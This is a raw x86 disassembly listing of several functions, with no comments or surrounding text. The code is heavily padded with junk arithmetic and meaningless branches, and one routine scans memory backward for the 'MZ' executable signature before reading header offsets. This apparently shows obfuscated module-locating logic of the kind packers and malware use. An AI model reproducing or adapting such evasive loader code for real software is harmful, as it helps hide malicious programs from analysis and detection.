  4029fa:	cmp    DWORD PTR [ebp-0x18],ecx
  4029fd:	je     0x402b39
  402a03:	mov    BYTE PTR [ebp-0x20],0x0
  402a07:	movzx  eax,BYTE PTR [ebp-0x20]
  402a0b:	mov    ecx,0x62
  402a10:	xor    edx,edx
  402a12:	div    ecx
  402a14:	mov    BYTE PTR [ebp-0x20],al
  402a17:	mov    al,BYTE PTR [ebp-0x20]
  402a1a:	test   al,al
  402a1c:	je     0x402a29
  402a1e:	movzx  edx,BYTE PTR [ebp-0x20]
  402a22:	mov    eax,edx
  402a24:	jmp    0x402b8e
  402a29:	mov    ecx,DWORD PTR [ebp+0xc]
  402a2c:	mov    DWORD PTR [ebp-0x24],ecx
  402a2f:	mov    al,BYTE PTR [ebp-0x20]
  402a32:	test   al,al
  402a34:	je     0x402a40
  402a36:	mov    edx,DWORD PTR [ebp-0x24]
  402a39:	mov    eax,edx
  402a3b:	jmp    0x402b8e
  402a40:	mov    edx,DWORD PTR [ebp+0xc]
  402a43:	and    edx,DWORD PTR [ebp-0x24]
  402a46:	xor    edx,0x2cc5
  402a4c:	mov    DWORD PTR [ebp-0x28],edx
  402a4f:	cmp    BYTE PTR [ebp-0x20],0xff
  402a53:	jne    0x402a5f
  402a55:	mov    ecx,DWORD PTR [ebp-0x28]
  402a58:	mov    eax,ecx
  402a5a:	jmp    0x402b8e
  402a5f:	mov    edx,DWORD PTR [ebp+0x8]
  402a62:	or     edx,0x37b6
  402a68:	movzx  eax,BYTE PTR [ebp-0x20]
  402a6c:	imul   edx,eax
  402a6f:	mov    DWORD PTR [ebp-0x2c],edx
  402a72:	cmp    BYTE PTR [ebp-0x20],0x0
  402a76:	jle    0x402a82
  402a78:	mov    edx,DWORD PTR [ebp-0x24]
  402a7b:	mov    eax,edx
  402a7d:	jmp    0x402b8e
  402a82:	mov    ecx,DWORD PTR [ebp-0x2c]
  402a85:	add    ecx,DWORD PTR [ebp-0x28]
  402a88:	add    ecx,0xffffd3b0
  402a8e:	movzx  eax,BYTE PTR [ebx+ecx*1]
  402a92:	mov    ecx,DWORD PTR [ebp-0x10]
  402a95:	mov    BYTE PTR [ecx],al
  402a97:	mov    eax,DWORD PTR [ebp-0x28]
  402a9a:	add    eax,0x1
  402a9d:	mov    DWORD PTR [ebp-0x28],eax
  402aa0:	mov    ecx,DWORD PTR [ebp-0x2c]
  402aa3:	test   ecx,ecx
  402aa5:	je     0x402ab1
  402aa7:	mov    ecx,DWORD PTR [ebp-0x2c]
  402aaa:	mov    eax,ecx
  402aac:	jmp    0x402b8e
  402ab1:	movzx  eax,BYTE PTR [ebp-0x20]
  402ab5:	or     eax,DWORD PTR [ebp-0x24]
  402ab8:	add    eax,0xffffff6c
  402abd:	mov    edx,DWORD PTR [ebp-0x10]
  402ac0:	add    edx,eax
  402ac2:	mov    DWORD PTR [ebp-0x10],edx
  402ac5:	mov    eax,DWORD PTR [ebp-0x28]
  402ac8:	add    eax,DWORD PTR [ebp-0x2c]
  402acb:	mov    WORD PTR [ebp-0x30],ax
  402acf:	cmp    BYTE PTR [ebp-0x20],0xff
  402ad3:	jne    0x402ae5
  402ad5:	mov    edx,DWORD PTR [ebp-0x24]
  402ad8:	imul   edx,edx,0xe7c20000
  402ade:	push   edx
  402adf:	call   DWORD PTR ds:0x422030
  402ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  402ae8:	add    edx,DWORD PTR [ebp-0x28]
  402aeb:	sub    edx,0x2c50
  402af1:	add    ebx,edx
  402af3:	movzx  edx,BYTE PTR [ebp-0x20]
  402af7:	shr    edx,0x3
  402afa:	mov    DWORD PTR [ebp-0x34],edx
  402afd:	cmp    BYTE PTR [ebp-0x20],0xff
  402b01:	jne    0x402b0e
  402b03:	movzx  ecx,BYTE PTR [ebp-0x20]
  402b07:	mov    eax,ecx
  402b09:	jmp    0x402b8e
  402b0e:	mov    edx,DWORD PTR [ebp-0x24]
  402b11:	movzx  ecx,BYTE PTR [ebp-0x20]
  402b15:	add    edx,ecx
  402b17:	sub    edx,0x94
  402b1d:	mov    eax,DWORD PTR [ebp-0x18]
  402b20:	sub    eax,edx
  402b22:	mov    DWORD PTR [ebp-0x18],eax
  402b25:	mov    eax,DWORD PTR [ebp-0x2c]
  402b28:	or     eax,DWORD PTR [ebp+0x8]
  402b2b:	add    eax,0x8d61
  402b30:	mov    WORD PTR [ebp-0x38],ax
  402b34:	jmp    0x4029ec
  402b39:	mov    edx,DWORD PTR [ebp+0xc]
  402b3c:	imul   edx,edx,0xa2
  402b42:	mov    WORD PTR [ebp-0x14],dx
  402b46:	mov    eax,0x5e7648e2
  402b4b:	xor    eax,0x5e35d8f2
  402b50:	mov    DWORD PTR [ebp-0x8],eax
  402b53:	movzx  edx,WORD PTR [ebp-0x14]
  402b57:	xor    edx,0x7100
  402b5d:	add    esi,edx
  402b5f:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  402b63:	jne    0x402b6d
  402b65:	movzx  edx,BYTE PTR [ebp-0xc]
  402b69:	mov    eax,edx
  402b6b:	jmp    0x402b8e
  402b6d:	mov    edx,DWORD PTR [ebp-0x8]
  402b70:	mov    eax,DWORD PTR [ebp-0x10]
  402b73:	mov    DWORD PTR [edx],eax
  402b75:	movzx  eax,WORD PTR [ebp-0x14]
  402b79:	xor    edx,edx
  402b7b:	div    esi
  402b7d:	mov    DWORD PTR [ebp-0x1c],eax
  402b80:	cmp    WORD PTR [ebp-0x14],0x5e4a
  402b86:	je     0x402b8c
  402b88:	mov    eax,esi
  402b8a:	jmp    0x402b8e
  402b8c:	mov    eax,esi
  402b8e:	pop    ebx
  402b8f:	pop    edi
  402b90:	pop    esi
  402b91:	mov    esp,ebp
  402b93:	pop    ebp
  402b94:	ret    0x8
  402b97:	push   ebp
  402b98:	mov    ebp,esp
  402b9a:	sub    esp,0xc
  402b9d:	push   esi
  402b9e:	push   edi
  402b9f:	push   ebx
  402ba0:	mov    esi,0x37
  402ba5:	mov    edx,esi
  402ba7:	or     edx,edx
  402ba9:	movzx  esi,dl
  402bac:	cmp    esi,0x37
  402baf:	jge    0x402bba
  402bb1:	mov    ecx,esi
  402bb3:	mov    eax,ecx
  402bb5:	jmp    0x402cbf
  402bba:	mov    ecx,esi
  402bbc:	shl    ecx,0x8
  402bbf:	movzx  edi,cl
  402bc2:	mov    ecx,edi
  402bc4:	test   cl,cl
  402bc6:	je     0x402bcf
  402bc8:	mov    eax,esi
  402bca:	jmp    0x402cbf
  402bcf:	mov    eax,esi
  402bd1:	shr    eax,0x3
  402bd4:	movzx  ebx,al
  402bd7:	cmp    esi,0x37
  402bda:	jge    0x402be5
  402bdc:	mov    ecx,esi
  402bde:	mov    eax,ecx
  402be0:	jmp    0x402cbf
  402be5:	mov    edx,edi
  402be7:	shr    edx,0x3
  402bea:	mov    BYTE PTR [ebp-0x4],dl
  402bed:	mov    ecx,ebx
  402bef:	or     ecx,0x83c5f887
  402bf5:	imul   ecx,edi
  402bf8:	movzx  ebx,cl
  402bfb:	cmp    edi,0xff
  402c01:	jne    0x402c0c
  402c03:	mov    edx,esi
  402c05:	mov    eax,edx
  402c07:	jmp    0x402cbf
  402c0c:	mov    ecx,ebx
  402c0e:	mov    BYTE PTR [ebp-0x8],cl
  402c11:	mov    eax,edi
  402c13:	test   al,al
  402c15:	je     0x402c22
  402c17:	movzx  edx,BYTE PTR [ebp-0x4]
  402c1b:	mov    eax,edx
  402c1d:	jmp    0x402cbf
  402c22:	movzx  eax,BYTE PTR [ebp-0x4]
  402c26:	shl    eax,0x10
  402c29:	mov    BYTE PTR [ebp-0xc],al
  402c2c:	cmp    esi,0x36
  402c2f:	jne    0x402c3a
  402c31:	movzx  eax,BYTE PTR [ebp-0xc]
  402c35:	jmp    0x402cbf
  402c3a:	mov    edx,esi
  402c3c:	movzx  eax,BYTE PTR [ebp-0x8]
  402c40:	add    edx,eax
  402c42:	sub    edx,DWORD PTR [ebp+0x10]
  402c45:	movzx  esi,dl
  402c48:	mov    edx,DWORD PTR [ebp+0xc]
  402c4b:	or     edx,0x468424f
  402c51:	movzx  ebx,dl
  402c54:	mov    edx,DWORD PTR [ebp+0xc]
  402c57:	mov    BYTE PTR [ebp-0x8],dl
  402c5a:	mov    ecx,ebx
  402c5c:	mov    BYTE PTR [ebp-0x4],cl
  402c5f:	cmp    BYTE PTR [ebp-0xc],0x0
  402c63:	jge    0x402c6b
  402c65:	movzx  eax,BYTE PTR [ebp-0xc]
  402c69:	jmp    0x402cbf
  402c6b:	cmp    BYTE PTR [ebp-0x8],0x5c
  402c6f:	jne    0x402c83
  402c71:	movzx  ecx,BYTE PTR [ebp-0xc]
  402c75:	push   ecx
  402c76:	movzx  edx,BYTE PTR [ebp-0xc]
  402c7a:	push   edx
  402c7b:	call   0x40147e
  402c80:	mov    BYTE PTR [ebp-0x8],al
  402c83:	movzx  ecx,BYTE PTR [ebp-0xc]
  402c87:	shr    ecx,1
  402c89:	movzx  esi,cl
  402c8c:	cmp    BYTE PTR [ebp-0x4],0x5f
  402c90:	je     0x402c9a
  402c92:	movzx  edx,BYTE PTR [ebp-0x8]
  402c96:	mov    eax,edx
  402c98:	jmp    0x402cbf
  402c9a:	mov    edx,esi
  402c9c:	movzx  edi,dl
  402c9f:	mov    eax,DWORD PTR [ebp+0xc]
  402ca2:	movzx  ebx,al
  402ca5:	mov    edx,DWORD PTR [ebp+0x8]
  402ca8:	and    edx,0x7f23
  402cae:	movzx  edi,dl
  402cb1:	movzx  eax,BYTE PTR [ebp-0x8]
  402cb5:	shr    eax,0x2
  402cb8:	mov    BYTE PTR [ebp-0xc],al
  402cbb:	mov    ecx,edi
  402cbd:	mov    eax,ecx
  402cbf:	pop    ebx
  402cc0:	pop    edi
  402cc1:	pop    esi
  402cc2:	mov    esp,ebp
  402cc4:	pop    ebp
  402cc5:	ret    0xc
  402cc8:	push   ebp
  402cc9:	mov    ebp,esp
  402ccb:	sub    esp,0x4
  402cce:	push   esi
  402ccf:	push   edi
  402cd0:	push   ebx
  402cd1:	mov    esi,DWORD PTR [ebp+0x8]
  402cd4:	mov    edx,esi
  402cd6:	imul   edx,edx
  402cd9:	sub    edx,DWORD PTR [ebp+0x14]
  402cdc:	mov    edi,edx
  402cde:	mov    edx,DWORD PTR [ebp+0x8]
  402ce1:	or     edx,0x7a
  402ce4:	mov    eax,edi
  402ce6:	sub    eax,edx
  402ce8:	movzx  ebx,ax
  402ceb:	test   edi,edi
  402ced:	jne    0x402cf7
  402cef:	push   esi
  402cf0:	call   0x4037fe
  402cf5:	mov    edi,eax
  402cf7:	mov    edi,DWORD PTR [ebp+0x14]
  402cfa:	mov    edx,ebx
  402cfc:	add    edx,edx
  402cfe:	add    edx,0x21000000
  402d04:	mov    edi,edx
  402d06:	cmp    esi,0xffffffff
  402d09:	jne    0x402d0f
  402d0b:	mov    eax,ebx
  402d0d:	jmp    0x402d18
  402d0f:	mov    ecx,esi
  402d11:	mov    BYTE PTR [ebp-0x4],cl
  402d14:	movzx  eax,BYTE PTR [ebp-0x4]
  402d18:	pop    ebx
  402d19:	pop    edi
  402d1a:	pop    esi
  402d1b:	mov    esp,ebp
  402d1d:	pop    ebp
  402d1e:	ret    0x10
  402d21:	push   ebp
  402d22:	mov    ebp,esp
  402d24:	sub    esp,0xc
  402d27:	push   esi
  402d28:	push   edi
  402d29:	push   ebx
  402d2a:	mov    edx,DWORD PTR [ebp+0xc]
  402d2d:	movzx  esi,dl
  402d30:	mov    edx,esi
  402d32:	shl    edx,0x18
  402d35:	movzx  edi,dl
  402d38:	cmp    edi,0x0
  402d3b:	jge    0x402d46
  402d3d:	mov    edx,esi
  402d3f:	mov    eax,edx
  402d41:	jmp    0x402e68
  402d46:	mov    eax,DWORD PTR [ebp+0x8]
  402d49:	and    eax,esi
  402d4b:	movzx  ebx,al
  402d4e:	cmp    esi,0x1
  402d51:	jne    0x402d5c
  402d53:	mov    ecx,edi
  402d55:	mov    eax,ecx
  402d57:	jmp    0x402e68
  402d5c:	mov    eax,esi
  402d5e:	and    eax,ebx
  402d60:	add    eax,0x3dd68be8
  402d65:	movzx  edi,al
  402d68:	mov    edx,esi
  402d6a:	shl    edx,0x18
  402d6d:	mov    WORD PTR [ebp-0x4],dx
  402d71:	cmp    edi,0xea
  402d77:	je     0x402d80
  402d79:	mov    eax,ebx
  402d7b:	jmp    0x402e68
  402d80:	cmp    esi,0x2
  402d83:	jne    0x402d8d
  402d85:	call   0x401fb1
  402d8a:	movzx  edi,al
  402d8d:	movzx  ecx,WORD PTR [ebp-0x4]
  402d91:	or     ecx,0x5b7
  402d97:	movzx  eax,WORD PTR [ebp-0x4]
  402d9b:	add    ecx,eax
  402d9d:	movzx  ebx,cl
  402da0:	cmp    WORD PTR [ebp-0x4],0x0
  402da5:	jle    0x402db2
  402da7:	movzx  ecx,WORD PTR [ebp-0x4]
  402dab:	mov    eax,ecx
  402dad:	jmp    0x402e68
  402db2:	mov    edx,edi
  402db4:	or     edx,0xf900
  402dba:	and    edx,esi
  402dbc:	mov    WORD PTR [ebp-0x8],dx
  402dc0:	cmp    edi,0x0
  402dc3:	jge    0x402dcc
  402dc5:	mov    eax,edi
  402dc7:	jmp    0x402e68
  402dcc:	mov    edx,ebx
  402dce:	shr    edx,0x3
  402dd1:	movzx  edi,dl
  402dd4:	cmp    esi,0x2
  402dd7:	jge    0x402de4
  402dd9:	movzx  ecx,WORD PTR [ebp-0x4]
  402ddd:	mov    eax,ecx
  402ddf:	jmp    0x402e68
  402de4:	mov    edx,ebx
  402de6:	mov    WORD PTR [ebp-0x4],dx
  402dea:	mov    eax,esi
  402dec:	or     eax,eax
  402dee:	movzx  esi,al
  402df1:	cmp    edi,0x16
  402df4:	jne    0x402e06
  402df6:	push   esi
  402df7:	movzx  ecx,WORD PTR [ebp-0x8]
  402dfb:	push   ecx
  402dfc:	push   edi
  402dfd:	call   0x401eca
  402e02:	mov    WORD PTR [ebp-0x4],ax
  402e06:	mov    ecx,esi
  402e08:	or     ecx,0x5f
  402e0b:	mov    WORD PTR [ebp-0xc],cx
  402e0f:	movzx  edx,WORD PTR [ebp-0x4]
  402e13:	and    edx,ebx
  402e15:	or     edx,0x56
  402e18:	mov    WORD PTR [ebp-0x4],dx
  402e1c:	cmp    WORD PTR [ebp-0x8],0x0
  402e21:	jge    0x402e2b
  402e23:	movzx  ecx,WORD PTR [ebp-0x4]
  402e27:	mov    eax,ecx
  402e29:	jmp    0x402e68
  402e2b:	mov    eax,ebx
  402e2d:	mov    ecx,0x1a
  402e32:	xor    edx,edx
  402e34:	div    ecx
  402e36:	mov    WORD PTR [ebp-0xc],ax
  402e3a:	mov    eax,DWORD PTR [ebp+0xc]
  402e3d:	sub    eax,0xf617
  402e42:	mov    WORD PTR [ebp-0xc],ax
  402e46:	cmp    WORD PTR [ebp-0xc],0x9eb
  402e4c:	jle    0x402e52
  402e4e:	mov    eax,esi
  402e50:	jmp    0x402e68
  402e52:	mov    edx,DWORD PTR [ebp+0x14]
  402e55:	mov    WORD PTR [ebp-0xc],dx
  402e59:	cmp    WORD PTR [ebp-0xc],0x2
  402e5e:	je     0x402e64
  402e60:	mov    eax,ebx
  402e62:	jmp    0x402e68
  402e64:	mov    edx,ebx
  402e66:	mov    eax,edx
  402e68:	pop    ebx
  402e69:	pop    edi
  402e6a:	pop    esi
  402e6b:	mov    esp,ebp
  402e6d:	pop    ebp
  402e6e:	ret    0x10
  402e71:	push   ebp
  402e72:	mov    ebp,esp
  402e74:	sub    esp,0x80
  402e7a:	push   esi
  402e7b:	push   edi
  402e7c:	push   ebx
  402e7d:	mov    esi,0x8a
  402e82:	mov    eax,esi
  402e84:	or     eax,0x5d
  402e87:	mov    ecx,DWORD PTR [ebp+0xc]
  402e8a:	imul   ecx,eax
  402e8d:	movzx  esi,cx
  402e90:	mov    edx,DWORD PTR [ebp+0x14]
  402e93:	movzx  edi,dx
  402e96:	mov    ecx,esi
  402e98:	movzx  ebx,cl
  402e9b:	cmp    edi,0x0
  402e9e:	jge    0x402ea9
  402ea0:	mov    edx,esi
  402ea2:	mov    eax,edx
  402ea4:	jmp    0x40371c
  402ea9:	mov    edx,edi
  402eab:	or     edx,ebx
  402ead:	push   edx
  402eae:	call   DWORD PTR ds:0x42201c
  402eb4:	movzx  edi,ax
  402eb7:	mov    eax,edi
  402eb9:	test   ax,ax
  402ebc:	je     0x402ed2
  402ebe:	mov    eax,edi
  402ec0:	xor    eax,0x5565
  402ec5:	mov    edx,edi
  402ec7:	add    edx,eax
  402ec9:	push   edx
  402eca:	push   edi
  402ecb:	push   ebx
  402ecc:	call   DWORD PTR ds:0x42203c
  402ed2:	mov    eax,DWORD PTR [ebp+0xc]
  402ed5:	imul   eax,DWORD PTR [ebp+0x14]
  402ed9:	mov    WORD PTR [ebp-0x4],ax
  402edd:	mov    cx,WORD PTR [ebp-0x4]
  402ee1:	test   cx,cx
  402ee4:	je     0x402f06
  402ee6:	movzx  ecx,WORD PTR [ebp-0x4]
  402eea:	xor    ecx,ebx
  402eec:	or     ecx,0xd9
  402ef2:	push   ecx
  402ef3:	mov    ecx,ebx
  402ef5:	or     ecx,0x6ae7
  402efb:	mov    edx,esi
  402efd:	add    edx,ecx
  402eff:	push   edx
  402f00:	call   DWORD PTR ds:0x422034
  402f06:	mov    DWORD PTR [ebp-0x8],0x87312909
  402f0d:	mov    ecx,esi
  402f0f:	shr    ecx,0x3
  402f12:	mov    WORD PTR [ebp-0xc],cx
  402f16:	cmp    ebx,0x0
  402f19:	jge    0x402f26
  402f1b:	movzx  edx,WORD PTR [ebp-0xc]
  402f1f:	mov    eax,edx
  402f21:	jmp    0x40371c
  402f26:	movzx  eax,WORD PTR [ebp-0xc]
  402f2a:	and    eax,ebx
  402f2c:	add    eax,0x87730905
  402f31:	mov    ecx,DWORD PTR [ebp-0x8]
  402f34:	xor    ecx,eax
  402f36:	mov    DWORD PTR [ebp-0x8],ecx
  402f39:	movzx  ecx,WORD PTR [ebp-0xc]
  402f3d:	imul   ecx,ecx,0x22000000
  402f43:	movzx  esi,cx
  402f46:	movzx  eax,WORD PTR [ebp-0x4]
  402f4a:	sub    eax,ebx
  402f4c:	push   eax
  402f4d:	call   DWORD PTR ds:0x422054
  402f53:	movzx  edi,ax
  402f56:	mov    eax,edi
  402f58:	test   ax,ax
  402f5b:	je     0x402f76
  402f5d:	movzx  ecx,WORD PTR [ebp-0xc]
  402f61:	push   ecx
  402f62:	movzx  ecx,WORD PTR [ebp-0xc]
  402f66:	movzx  edx,WORD PTR [ebp-0x4]
  402f6a:	sub    ecx,edx
  402f6c:	sub    ecx,0x3f
  402f6f:	push   ecx
  402f70:	call   DWORD PTR ds:0x422094
  402f76:	mov    ecx,esi
  402f78:	movzx  edx,WORD PTR [ebp-0x4]
  402f7c:	sub    ecx,edx
  402f7e:	mov    edx,DWORD PTR [ebp-0x8]
  402f81:	mov    eax,DWORD PTR [edx+ecx*4]
  402f84:	mov    edx,ebx
  402f86:	imul   edx,esi
  402f89:	add    eax,edx
  402f8b:	mov    DWORD PTR [ebp-0x10],eax
  402f8e:	mov    eax,DWORD PTR [ebp+0x10]
  402f91:	xor    eax,0x172556ed
  402f96:	mov    WORD PTR [ebp-0x14],ax
  402f9a:	cmp    WORD PTR [ebp-0x14],0x56ed
  402fa0:	jle    0x402fa9
  402fa2:	mov    eax,esi
  402fa4:	jmp    0x40371c
  402fa9:	mov    ecx,DWORD PTR [ebp-0x10]
  402fac:	add    ecx,0x0
  402faf:	mov    WORD PTR [ebp-0x18],cx
  402fb3:	mov    eax,ebx
  402fb5:	shl    eax,0x18
  402fb8:	mov    DWORD PTR [ebp-0x1c],eax
  402fbb:	movzx  ecx,WORD PTR [ebp-0x4]
  402fbf:	movzx  eax,WORD PTR [ebp-0x14]
  402fc3:	xor    ecx,eax
  402fc5:	sub    ecx,0x56ed
  402fcb:	mov    edx,DWORD PTR [ebp-0x10]
  402fce:	add    edx,ecx
  402fd0:	movzx  ecx,WORD PTR [ebp-0x18]
  402fd4:	sub    edx,ecx
  402fd6:	mov    DWORD PTR [ebp-0x10],edx
  402fd9:	mov    eax,esi
  402fdb:	or     eax,0xe61900
  402fe0:	mov    DWORD PTR [ebp-0x1c],eax
  402fe3:	cmp    WORD PTR [ebp-0x14],0x56ec
  402fe9:	jne    0x402ff4
  402feb:	mov    ecx,ebx
  402fed:	mov    eax,ecx
  402fef:	jmp    0x40371c
  402ff4:	mov    edx,esi
  402ff6:	movzx  ecx,WORD PTR [ebp-0x4]
  402ffa:	add    edx,ecx
  402ffc:	mov    ecx,DWORD PTR [ebp-0x10]
  402fff:	add    ecx,edx
  403001:	mov    DWORD PTR [ebp-0x20],ecx
  403004:	movzx  edx,WORD PTR [ebp-0x4]
  403008:	and    edx,DWORD PTR [ebp-0x1c]
  40300b:	mov    WORD PTR [ebp-0xc],dx
  40300f:	cmp    DWORD PTR [ebp-0x1c],0xe618ff
  403016:	jne    0x403021
  403018:	movzx  eax,WORD PTR [ebp-0x4]
  40301c:	jmp    0x40371c
  403021:	mov    eax,DWORD PTR [ebp-0x1c]
  403024:	movzx  ecx,WORD PTR [ebp-0xc]
  403028:	sub    eax,ecx
  40302a:	sub    eax,0xe61900
  40302f:	mov    ecx,0x17a061ec
  403034:	add    ecx,eax
  403036:	mov    DWORD PTR [ebp-0x24],ecx
  403039:	mov    ecx,DWORD PTR [ebp+0x14]
  40303c:	sub    ecx,ebx
  40303e:	mov    WORD PTR [ebp-0xc],cx
  403042:	mov    ecx,edi
  403044:	and    ecx,esi
  403046:	mov    edx,DWORD PTR [ebp-0x20]
  403049:	movzx  eax,WORD PTR [edx+ecx*2]
  40304d:	cmp    eax,0x5a4d
  403052:	je     0x40308d
  403054:	mov    edx,DWORD PTR [ebp+0x10]
  403057:	mov    WORD PTR [ebp-0x28],dx
  40305b:	movzx  edx,WORD PTR [ebp-0x28]
  40305f:	imul   edx,edx
  403062:	movzx  ecx,WORD PTR [ebp-0x28]
  403066:	sub    edx,ecx
  403068:	mov    BYTE PTR [ebp-0x2c],dl
  40306b:	movzx  edx,BYTE PTR [ebp-0x2c]
  40306f:	mov    WORD PTR [ebp-0x30],dx
  403073:	movzx  ecx,WORD PTR [ebp-0x28]
  403077:	movzx  eax,WORD PTR [ebp-0x30]
  40307b:	and    ecx,eax
  40307d:	sub    ecx,0xffff0000
  403083:	mov    edx,DWORD PTR [ebp-0x20]
  403086:	sub    edx,ecx
  403088:	mov    DWORD PTR [ebp-0x20],edx
  40308b:	jmp    0x403042
  40308d:	movzx  eax,WORD PTR [ebp-0x14]
  403091:	or     eax,esi
  403093:	sub    eax,0x56ed
  403098:	mov    ecx,DWORD PTR [ebp-0x20]
  40309b:	add    ecx,eax
  40309d:	mov    DWORD PTR [ebp-0x8],ecx
  4030a0:	mov    eax,ebx
  4030a2:	xor    edx,edx
  4030a4:	div    DWORD PTR [ebp-0x1c]
  4030a7:	mov    WORD PTR [ebp-0x14],ax
  4030ab:	movzx  ecx,WORD PTR [ebp-0x4]
  4030af:	and    ecx,DWORD PTR [ebp-0x1c]
  4030b2:	add    ecx,0xf
  4030b5:	mov    edx,DWORD PTR [ebp-0x8]
  4030b8:	mov    eax,DWORD PTR [edx+ecx*4]
  4030bb:	mov    edx,DWORD PTR [ebp-0x8]
  4030be:	add    edx,eax
  4030c0:	movzx  eax,WORD PTR [ebp-0x14]
  4030c4:	xor    eax,edi
  4030c6:	sub    edx,eax
  4030c8:	mov    DWORD PTR [ebp-0x8],edx
  4030cb:	mov    eax,edi
  4030cd:	mov    WORD PTR [ebp-0x14],ax
  4030d1:	mov    ecx,edi
  4030d3:	movzx  edx,WORD PTR [ebp-0x14]
  4030d7:	imul   ecx,edx
  4030da:	add    ecx,0x1e
  4030dd:	mov    edx,DWORD PTR [ebp-0x8]
  4030e0:	mov    eax,DWORD PTR [edx+ecx*4]
  4030e3:	mov    ecx,DWORD PTR [ebp-0x20]
  4030e6:	add    ecx,eax
  4030e8:	movzx  eax,WORD PTR [ebp-0x4]
  4030ec:	imul   eax,esi
  4030ef:	sub    ecx,eax
  4030f1:	mov    DWORD PTR [ebp-0x34],ecx
  4030f4:	mov    edx,DWORD PTR [ebp+0x8]
  4030f7:	imul   edx,edx,0xea9500
  4030fd:	movzx  edi,dx
  403100:	mov    ax,WORD PTR [ebp-0x4]
  403104:	test   ax,ax
  403107:	je     0x403113
  403109:	mov    ecx,DWORD PTR [ebp-0x1c]
  40310c:	mov    eax,ecx
  40310e:	jmp    0x40371c
  403113:	movzx  eax,WORD PTR [ebp-0x4]
  403117:	xor    eax,ebx
  403119:	sub    eax,0xfffffffa
  40311c:	mov    ecx,DWORD PTR [ebp-0x34]
  40311f:	mov    edx,DWORD PTR [ecx+eax*4]
  403122:	movzx  eax,WORD PTR [ebp-0x14]
  403126:	xor    eax,ebx
  403128:	sub    edx,eax
  40312a:	mov    DWORD PTR [ebp-0x10],edx
  40312d:	mov    edx,esi
  40312f:	add    edx,edi
  403131:	movzx  edi,dx
  403134:	movzx  edx,WORD PTR [ebp-0x4]
  403138:	imul   edx,DWORD PTR [ebp-0x1c]
  40313c:	add    edx,0x8
  40313f:	mov    eax,DWORD PTR [ebp-0x34]
  403142:	mov    ecx,DWORD PTR [eax+edx*4]
  403145:	mov    eax,DWORD PTR [ebp-0x20]
  403148:	add    eax,ecx
  40314a:	mov    edx,ebx
  40314c:	add    edx,esi
  40314e:	sub    eax,edx
  403150:	mov    DWORD PTR [ebp-0x38],eax
  403153:	mov    eax,DWORD PTR [ebp-0x1c]
  403156:	sub    eax,0xf6
  40315b:	mov    WORD PTR [ebp-0x14],ax
  40315f:	cmp    edi,0xffff
  403165:	jne    0x403170
  403167:	movzx  eax,WORD PTR [ebp-0xc]
  40316b:	jmp    0x40371c
  403170:	movzx  edx,WORD PTR [ebp-0x4]
  403174:	or     edx,DWORD PTR [ebp-0x1c]
  403177:	sub    edx,0xe61900
  40317d:	cmp    DWORD PTR [ebp-0x10],edx
  403180:	je     0x40370f
  403186:	mov    DWORD PTR [ebp-0x3c],0xe211aa1f
  40318d:	mov    edx,DWORD PTR [ebp-0x3c]
  403190:	mov    WORD PTR [ebp-0x40],dx
  403194:	mov    ecx,DWORD PTR [ebp-0x3c]
  403197:	shr    ecx,0x2
  40319a:	mov    DWORD PTR [ebp-0x44],ecx
  40319d:	cmp    DWORD PTR [ebp-0x44],0x38846a87
  4031a4:	je     0x4031af
  4031a6:	movzx  eax,WORD PTR [ebp-0x40]
  4031aa:	jmp    0x40371c
  4031af:	mov    eax,DWORD PTR [ebp-0x44]
  4031b2:	movzx  edx,WORD PTR [ebp-0x40]
  4031b6:	xor    eax,edx
  4031b8:	add    eax,0xc77b3f68
  4031bd:	mov    ecx,DWORD PTR [ebp-0x38]
  4031c0:	mov    edx,DWORD PTR [ecx+eax*4]
  4031c3:	add    edx,DWORD PTR [ebp-0x20]
  4031c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4031c9:	or     eax,DWORD PTR [ebp-0x44]
  4031cc:	sub    eax,0xfa95ea9f
  4031d1:	add    edx,eax
  4031d3:	mov    DWORD PTR [ebp-0x48],edx
  4031d6:	mov    eax,DWORD PTR [ebp-0x3c]
  4031d9:	shr    eax,0x3
  4031dc:	mov    WORD PTR [ebp-0x40],ax
  4031e0:	cmp    DWORD PTR [ebp-0x3c],0xe211aa1f
  4031e7:	jle    0x4031f1
  4031e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4031ec:	jmp    0x40371c
  4031f1:	mov    ecx,DWORD PTR [ebp-0x3c]
  4031f4:	movzx  edx,WORD PTR [ebp-0x40]
  4031f8:	and    ecx,edx
  4031fa:	sub    ecx,0x2003
  403200:	mov    DWORD PTR [ebp-0x4c],ecx
  403203:	mov    edx,DWORD PTR [ebp-0x44]
  403206:	mov    WORD PTR [ebp-0x50],dx
  40320a:	cmp    WORD PTR [ebp-0x40],0x3543
  403210:	jge    0x40324d
  403212:	movzx  ecx,WORD PTR [ebp-0x40]
  403216:	push   ecx
  403217:	mov    ecx,DWORD PTR [ebp-0x3c]
  40321a:	xor    ecx,0x2e82
  403220:	and    ecx,DWORD PTR [ebp-0x3c]
  403223:	push   ecx
  403224:	mov    ecx,DWORD PTR [ebp-0x44]
  403227:	or     ecx,0x19e5
  40322d:	movzx  eax,WORD PTR [ebp-0x40]
  403231:	xor    ecx,eax
  403233:	push   ecx
  403234:	movzx  edx,WORD PTR [ebp-0x40]
  403238:	push   edx
  403239:	movzx  edx,WORD PTR [ebp-0x40]
  40323d:	xor    edx,DWORD PTR [ebp-0x44]
  403240:	movzx  ecx,WORD PTR [ebp-0x50]
  403244:	add    ecx,edx
  403246:	push   ecx
  403247:	call   DWORD PTR ds:0x422058
  40324d:	cmp    DWORD PTR [ebp-0x3c],0xe211aa1e
  403254:	jne    0x40325e
  403256:	mov    eax,DWORD PTR [ebp-0x3c]
  403259:	jmp    0x40371c
  40325e:	mov    ecx,DWORD PTR [ebp-0x48]
  403261:	movzx  eax,BYTE PTR [ecx]
  403264:	mov    edx,DWORD PTR [ebp-0x44]
  403267:	or     edx,DWORD PTR [ebp-0x3c]
  40326a:	sub    edx,0xfa95ea9f
  403270:	cmp    eax,edx
  403272:	je     0x40342d
  403278:	mov    edx,DWORD PTR [ebp+0x8]
  40327b:	mov    WORD PTR [ebp-0x54],dx
  40327f:	movzx  ecx,WORD PTR [ebp-0x54]
  403283:	add    ecx,0xa8c942d4
  403289:	movzx  eax,WORD PTR [ebp-0x54]
  40328d:	add    ecx,eax
  40328f:	mov    WORD PTR [ebp-0x58],cx
  403293:	cmp    WORD PTR [ebp-0x58],0x42d3
  403299:	jne    0x4032a6
